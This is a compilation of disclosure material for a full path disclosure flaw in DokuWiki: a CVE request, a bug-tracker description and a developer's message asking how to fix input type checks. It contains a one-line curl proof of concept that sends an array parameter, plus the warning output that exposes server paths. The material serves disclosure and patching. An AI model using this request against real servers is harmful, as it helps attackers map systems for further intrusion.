Subject: CVE request: Full path disclosure in DokuWiki

Full path disclosure in DokuWiki
========================================
  DokuWiki is a simple to use Wiki aimed at the documentation needs of a small
company. It works on plain text files and thus needs no database. It has a
simple but powerful syntax which makes sure the datafiles remain readable
outside the Wiki.

  The POST input 'prefix' is not checked/casted for proper data type before
passing to PHP's substr() function, which lead to displays an warning with
sensitive information on server with PHP error level enabled:

  $PRE   = cleanText(substr($_POST['prefix'], 0, -1));

$ curl -dprefix[]=1 <http://localhost/dokuwiki/doku.php> 2> /dev/null |
grep Warning
<b>Warning</b>:  substr() expects parameter 1 to be string, array given in
<b>/var/www/dokuwiki/doku.php</b> on line <b>47</b><br />
<b>Warning</b>:  Cannot modify header information - headers already sent by
(output started at /var/www/dokuwiki/doku.php:47) in
<b>/var/www/dokuwiki/inc/actions.php</b> on line <b>180</b><br />

Affected versions:
========================================
- Angua (RC1)
- Rincewind
- Anteater

| [Description](show_bug.cgi?id=835145#c0)  Jan Lieskovsky    2012-06-25 16:48:09 UTC  ``` A full path disclosure flaw was found in the way DokuWiki, a standards compliant, simple to use Wiki, performed sanitization of HTTP POST 'prefix' input value prior passing it to underlying PHP substr() routine, when the PHP error level has been enabled on the particular server. A remote attacker could use this flaw to obtain full path location of particular requested DokuWiki page by issuing a specially-crafted HTTP POST request.

# [dokuwiki] Fwd: DokuWiki - Full path disclosure

Hi *,

I just got this report and wondering how to deal with it.The specified
problem can easily be fixed with a cast to string, but I guess we have
a bunch of other parameters as well that might cause warnings when
filled with a wrong parameter type...

Does anyone have a suggestion how to fix this at other places as well,
in a systematic manner? Would be grepping for _POST, _REQUEST, _GET to
build a list of all user inputs be a good idea? Then making sure each
of them can only contain the right type by going through the list?

Any better ideas?

Andi

Full path disclosure in DokuWiki
========================

DokuWiki is a simple to use Wiki aimed at the documentation needs of a
small company. It works on plain text files and thus needs no
database. It has a simple but powerful syntax which makes sure the
datafiles remain readable outside the Wiki.

The POST input 'prefix' is not checked/casted for proper data type
before passing to PHP's substr() function, which lead to displays a
warning displays sensitive information:

  $PRE   = cleanText(substr($_POST['prefix'], 0, -1));

$ curl -dprefix[]=1 <http://localhost/dokuwiki/doku.php> 2> /dev/null |
grep Warning
<b>Warning</b>:  substr() expects parameter 1 to be string, array
given in <b>/var/www/dokuwiki/doku.php</b> on line <b>47</b><br />
<b>Warning</b>:  Cannot modify header information - headers already
sent by (output started at /var/www/dokuwiki/doku.php:47) in
<b>/var/www/dokuwiki/inc/actions.php</b> on line <b>180</b><br />

Affected versions:
=============
- Angua (RC1)
- Rincewind
- Anteater
